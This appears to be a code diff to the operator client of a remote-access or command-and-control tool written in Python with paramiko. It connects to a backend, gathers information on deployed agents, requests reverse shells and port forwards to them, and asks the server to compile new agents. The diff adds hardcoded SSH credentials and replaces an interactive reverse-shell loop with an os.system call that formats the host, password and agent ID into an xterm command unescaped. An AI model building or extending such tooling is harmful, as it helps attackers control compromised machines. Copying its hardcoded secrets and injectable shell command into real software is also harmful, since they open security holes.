@@ -20,6 +20,9 @@ class Session():
     def __init__(self, address, port=22):
         self.address = address
         self.port = port
+        self.username = 'aris'
+        self.password = 'lala'
+
         self.ssh = paramiko.SSHClient()
         self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         self.channel = 0
@@ -53,7 +56,7 @@ class Session():
         return ret
 
     def init_connection(self):
-        self.ssh.connect(hostname=self.address, port=self.port, username='aris', password='lala', allow_agent=False)
+        self.ssh.connect(hostname=self.address, port=self.port, username=self.username, password=self.password, allow_agent=False)
 
         self.channel = self.ssh._transport.open_session()
         self.channel.invoke_shell()
@@ -79,6 +82,25 @@ class Session():
                 self.channel.sendall('0')
         
         print("[+] Successfully gathered agent information")
+
+    @staticmethod
+    def init_channel(address, port, user, passwd):
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(hostname=address, port=port, username=user, password=passwd, allow_agent=False)
+        channel = ssh._transport.open_session()
+        channel.invoke_shell()
+
+        stdin = channel.makefile('wb')
+        stdout = channel.makefile('r')
+
+        # Initiate the connection
+        channel.sendall("0")
+        out = channel.recv(5)
+        
+        print("[+] Successfully gathered agent information")
+        return channel
+
 
     def update(self):
         out = ""
@@ -200,48 +222,11 @@ class Session():
         self.channel.sendall("27|%s:%s" % (agent_id, port))
 
     def do_revsh(self, agent_id, port):
-        exiting = False
-        inputs = []
-        inputs.append(self.channel)
-        pty = Shell()
-        inputs.append(pty)
-        cbuffer = ""
-
-        print("[+] Connected")
-        while not exiting:
-            try:
-                inputrd, outputrd, errorrd = select.select(inputs,[],[])
-            except select.error as e:
-                print(str(e))
-                break   
-            #except socket.error as e:
-             #   print(str(e))
-              #  break
-
-            for s in inputrd:
-                if s == self.channel:
-                    try:
-                        data = s.recv(1)
-                        data = data.decode()
-                    except UnicodeDecodeError:
-                        print("Failed to decode data")
-                        print(data)
-                        continue
-                    if data == '':
-                        print("Backconnect vanished!")
-                        sys.exit(1)
-
-                    cbuffer += data
-                    cbuffer = cbuffer.encode()
-                    pty.write(cbuffer)
-                    cbuffer = ""
-            
-                elif s == pty:
-                    data = s.read(1024)
-                    self.channel.send(data)
-                else:
-                    print("Woops finding inputfd")
-            cbuffer = ""
+        # for the time being, we just gonna
+        # throw this into a separate backgrounded system()
+        # because im lazy
+        comm = "xterm -e python3 shell.py %s %s %s %s %s &" % (self.address, self.port, self.username, self.password, agent_id)
+        os.system(comm)
 
     def compile_agent(self, ip, port):
         print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
@@ -271,31 +256,3 @@ class Session():
             self.channel = 0
             print("[+] Backend closed down")
 
-class Shell(object):
-    def __init__(self, port, slave=0, pid=os.getpid()):
-        self.port = port
-
-        self.termios, self.fcntl = termios, fcntl
-
-        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+", buffering=0)
-
-        self.oldtermios = termios.tcgetattr(self.pty)
-        newattr = termios.tcgetattr(self.pty)
-        newattr[3] &= ~termios.ICANON & ~termios.ECHO
-
-        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)
-
-        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
-        fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
-        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)
-
-    def read(self, size=8192):
-        return self.pty.read(size)
-    def write(self, data):
-        return self.pty.write(data)
-    def fileno(self):
-        return self.pty.fileno()
-    def __del__(self):
-        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH,self.oldtermios)
-        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)
-    
